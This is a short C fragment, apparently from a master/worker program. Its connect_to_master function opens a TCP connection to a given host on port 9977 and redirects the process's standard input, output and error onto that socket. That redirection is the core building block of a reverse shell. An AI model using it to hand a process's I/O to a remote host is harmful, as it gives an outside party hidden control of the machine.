#include	<sys/types.h>
#include	<sys/socket.h>
#define		BSD_COMP	1
#include	<sys/ioctl.h>
#include	<netinet/in.h>
#include	<arpa/inet.h>
#include	<netdb.h>

#define	PORT	9977

connect_to_master(char	*hostname)
{
	int	s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	struct hostent	*he;
	unsigned int	ip;
	struct sockaddr_in	addr;

	if(s<0) { perror("socket"); exit(-1); }
	he = gethostbyname(hostname);
	if(!he) { perror("gethostbyname"); exit(-1); }

	ip = *(unsigned int*)he->h_addr;
	//printf("remote IP: %.8X\n", ntohl(ip));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(PORT);
	addr.sin_addr.s_addr = ip;
	if(connect(s, (void*)&addr, sizeof(addr)))
		{ perror("connect"); exit(-1); }

	//printf("connected.\n");

	close(0); close(1); close(2);
	dup2(s, 0);
	dup2(s, 1);
	dup2(s, 2);
	close(s);
}
